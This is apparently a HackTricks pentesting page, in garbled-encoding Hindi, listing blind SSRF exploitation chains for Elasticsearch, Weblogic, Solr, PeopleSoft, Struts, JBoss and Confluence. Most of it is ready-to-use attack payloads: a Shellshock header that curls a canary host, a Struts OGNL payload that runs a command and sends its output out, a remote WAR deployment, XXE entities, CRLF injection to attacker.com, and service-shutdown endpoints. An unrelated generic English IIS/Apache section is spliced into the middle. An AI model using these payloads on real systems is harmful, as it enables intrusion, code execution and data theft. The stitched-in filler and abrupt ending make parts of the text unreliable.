# SSRF рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>

рдпрд╣ рдЦрдВрдб [https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/) рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

## Elasticsearch

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 9200**

рдЬрдм Elasticsearch рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЖрдВрдзреЗ SSRF рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдВрдд-рдмрд┐рдВрджреБрдУрдВ рдХреЛ рджреЗрдЦреЗрдВ рдЬреЛ 200 рд▓реМрдЯрд╛рддреЗ рд╣реИрдВ:
```http
/_cluster/health
/_cat/indices
/_cat/health
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдмреНрд▓рд╛рдЗрдВрдб SSRF рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк POST рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рдкрд░ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ Elasticsearch рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдмрдВрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдиреЛрдЯ: `_shutdown` API рдХреЛ Elasticsearch рд╕рдВрд╕реНрдХрд░рдг 2.x рдФрд░ рдКрдкрд░ рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ Elasticsearch 1.6 рдФрд░ рдиреАрдЪреЗ рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80, 443 (SSL), 7001, 8888**

**SSRF рдХреИрдирд░реА: UDDI Explorer (CVE-2014-4210)**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
рдпрд╣ GET рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рднреА CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдореЗрдВ рдкрд░рд┐рдгрд╛рдо рджреЗрдЧрд╛:
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF Canary: CVE-2020-14883**

рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред [рдпрд╣рд╛рдВ](https://forum.90sec.com/t/topic/1412) рд╕реЗред

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
# SSRF Vulnerable Platforms

## Windows

### IIS (Internet Information Services)

IIS is a web server developed by Microsoft for hosting websites on Windows servers. It is vulnerable to SSRF attacks when misconfigured or outdated.

#### Exploitation

To exploit SSRF in IIS, you can use the following techniques:

1. **Local File Inclusion (LFI)**: If the server allows file inclusion, you can use it to read local files, including sensitive system files.

2. **Remote File Inclusion (RFI)**: If the server allows remote file inclusion, you can include a file from a remote server, which can be used to execute arbitrary code.

3. **DNS Rebinding**: By exploiting DNS rebinding, you can bypass the same-origin policy and access internal resources.

#### Mitigation

To mitigate SSRF vulnerabilities in IIS, follow these best practices:

1. **Input Validation**: Implement strict input validation to prevent attackers from injecting malicious URLs.

2. **Whitelisting**: Use whitelisting to restrict the URLs that can be accessed by the server.

3. **Update and Patch**: Keep the server and all software up to date with the latest security patches.

4. **Least Privilege**: Ensure that the server has the least privilege necessary to perform its functions.

5. **Firewall Rules**: Configure firewall rules to restrict outgoing connections from the server.

### Apache HTTP Server

Apache HTTP Server is a popular open-source web server. It can also be vulnerable to SSRF attacks if misconfigured or outdated.

#### Exploitation

To exploit SSRF in Apache HTTP Server, you can use similar techniques as mentioned for IIS, such as LFI, RFI, and DNS rebinding.

#### Mitigation

To mitigate SSRF vulnerabilities in Apache HTTP Server, follow these best practices:

1. **Input Validation**: Implement strict input validation to prevent attackers from injecting malicious URLs.

2. **Whitelisting**: Use whitelisting to restrict the URLs that can be accessed by the server.

3. **Update and Patch**: Keep the server and all software up to date with the latest security patches.

4. **Least Privilege**: Ensure that the server has the least privilege necessary to perform its functions.

5. **Firewall Rules**: Configure firewall rules to restrict outgoing connections from the server.

### Other Windows Platforms

Apart from IIS and Apache HTTP Server, other Windows platforms can also be vulnerable to SSRF attacks if they have misconfigurations or outdated software.

#### Mitigation

To mitigate SSRF vulnerabilities in other Windows platforms, follow these best practices:

1. **Input Validation**: Implement strict input validation to prevent attackers from injecting malicious URLs.

2. **Whitelisting**: Use whitelisting to restrict the URLs that can be accessed by the platform.

3. **Update and Patch**: Keep the platform and all software up to date with the latest security patches.

4. **Least Privilege**: Ensure that the platform has the least privilege necessary to perform its functions.

5. **Firewall Rules**: Configure firewall rules to restrict outgoing connections from the platform.
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 8500, 8501 (SSL)**

рдпрд╣рд╛рдВ [рд╡реНрд░рд┐рдЯрдЕрдк](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html) рдорд┐рд▓реЗрдЧрд╛ред

## Shellshock

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80, 443 (SSL), 8080**

рд╢реЗрд▓рд╢реЙрдХ рдХреА рдкреНрд░рднрд╛рд╡реА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ рдкреЗрд▓реЛрдб рд╕рдореЗрдд рд╣реЗрдбрд░ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CGI рдкрдереЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ:

рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП CGI рдкрдереЛрдВ рдХреА рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╕реВрдЪреА:

[Gist рдореЗрдВ рдкрдереЛрдВ рдХреЛ рд╕рдореЗрдЯрдиреЗ рд╡рд╛рд▓рд╛](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4)ред

**SSRF рдХреИрдирд╛рд░реА: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╢реЗрд▓рд╢реЙрдХ**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80, 8080, 8888, 8082**

рдпрд╣рд╛рдВ [рдЕрдкрд╛рдЪреЗ рдбреНрд░реБрдЗрдб](https://druid.apache.org/docs/latest/operations/api-reference.html) рдХреЗ рд▓рд┐рдП API рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВред

рдпрджрд┐ рдЖрдк рд╕реНрдерд┐рддрд┐ рдХреЛрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдереЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ 200 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд▓реМрдЯрд╛рддреЗ рд╣реИрдВ:
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
рд╢рдЯрдбрд╛рдЙрди рдХрд╛рд░реНрдп, рдЖрдкрдХреЛ рдХрд╛рд░реНрдп рдЖрдИрдбреА рдпрд╛ рдбреЗрдЯрд╛рд╕реЛрд░реНрд╕ рдХрд╛ рдирд╛рдо рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
рдЕрдкрд╛рдЪреЗ рдбреНрд░реБрдЗрдб рдУрд╡рд░рд▓реЙрд░реНрдб рдкрд░ рд╕реБрдкрд░рд╡рд╛рдЗрдЬрд░реНрд╕ рдХреЛ рдмрдВрдж рдХрд░реЗрдВ:
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 8983**

**SSRF рдХреИрдирд╛рд░реА: рд╢рд╛рд░реНрдбреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░**

> рд╢реБрднрдо рдЬреЛ рдХрд╣ рд░рд╣рд╛ рд╣реИ рдЙрд╕реЗ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП - рд╕реЙрд▓рд░ рдХреЗ рд▓рд┐рдП рд╕реНрдХреИрдирд┐рдВрдЧ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдЖрд╕рд╛рди рд╣реИред рд╢рд╛рд░реНрдбреНрд╕= рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рд╕реЙрд▓рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдмрд┐рдирд╛ рдЬрд╛рдВрдЪреЗ рдПрд╕рдПрд╕рдЖрд░рдПрдл рдХреЛ рдмрд╛рдЙрдВрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
>
> тАФ ╨е╨░╨▓╨╕╨╢ ╨Эрд╛реЮреНрдлреА ЁЯеХ (@nnwakelam) [13 рдЬрдирд╡рд░реА 2021](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ [рдпрд╣рд╛рдВ](https://github.com/veracode-research/solr-injection)
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**рдбреЗрдЯрд╛ рдЗрдВрдкреЛрд░реНрдЯ рд╣реИрдВрдбрд▓рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**

[рдбреЗрдЯрд╛ рдЗрдВрдкреЛрд░реНрдЯ рд╣реИрдВрдбрд▓рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдкрд░ рдЕрдиреБрд╕рдВрдзрд╛рди](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдВрдзреЗ рдЧрдП рдкреЛрд░реНрдЯ: 80,443 (SSL)**

рдЗрд╕ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ [рдпрд╣рд╛рдВ](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRF рдХреИрдирд╛рд░реА: XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# SSRF Canary: XXE #2

рдпрд╣ рдПрдХ рдФрд░ SSRF рдХреИрдирд░реА рд╣реИ рдЬрд┐рд╕рдореЗрдВ XXE (XML External Entity) рдЕрдЯреИрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕реЗ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ XXE рд╕рдВрдмрдВрдзрд┐рдд рд╕рдорд╕реНрдпрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рдЕрдЯреИрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЖрдк SSRF рдЕрдЯреИрдХ рдХреЛ рдЕрдкрдиреЗ рд▓рд╛рдн рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдХреИрдирд░реА рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

1. рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдЖрдк SSRF рдЕрдЯреИрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рд╣реЛред
2. рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЗрд╕ рдПрдХреНрд╕рдПрдордПрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. рдРрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕рдПрдордПрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВред
4. рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рдЕрдЯреИрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ SSRF рдЕрдЯреИрдХ рдЕрдиреБрд░реЛрдз рдмрдирд╛рдПрдВред

рдпрджрд┐ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ XXE рд╕рдВрдмрдВрдзрд┐рдд рд╕рдорд╕реНрдпрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдЕрдЯреИрдХ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдФрд░ рдЖрдкрдХреЛ SSRF рдЕрдЯреИрдХ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдзрд╛рди рджреЗрдЧрд╛ред рдЖрдк рдЗрд╕ рд╡рд┐рдзрд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╕рд░реНрд╡рд░реЛрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдХреИрдирд░реА рдХреЗрд╡рд▓ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ XXE рд╕рдВрдмрдВрдзрд┐рдд рд╕рдорд╕реНрдпрд╛ рд╣реЛрдиреЗ рдкрд░ рдХрд╛рдо рдХрд░реЗрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЗрд╕реЗ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдкрд░ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

[рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF рдХреИрдирд╛рд░реА: Struts2-016**:

рдЗрд╕реЗ рдЖрдк рдЬрд╛рдирддреЗ рд╣реБрдП рд╣рд░ рдЖрдВрддрд░рд┐рдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ/URL рдХреЗ рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ:
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

[рдпрд╣рд╛рдБ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF рдХреИрдирд░реА: URL рд╕реЗ WAR рдбрд┐рдкреНрд▓реЙрдп рдХрд░реЗрдВ**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдВрдзрд┐рдд рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

**SSRF рдХреИрдирд╛рд░реА: рд╢реЗрдпрд░рд▓рд┐рдВрдХреНрд╕ (2016 рдирд╡рдВрдмрд░ рд╕реЗ рдкрд╣рд▓реЗ рдЬрд╛рд░реА рдХреА рдЧрдИ Confluence рд╕рдВрд╕реНрдХрд░рдг)**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF рдХреИрдиреЗрд░реА: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[рдЕрдЯрд▓рд╛рд╕рд┐рдпрди рд╕реБрд░рдХреНрд╖рд╛ рдЯрд┐рдХрдЯ OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
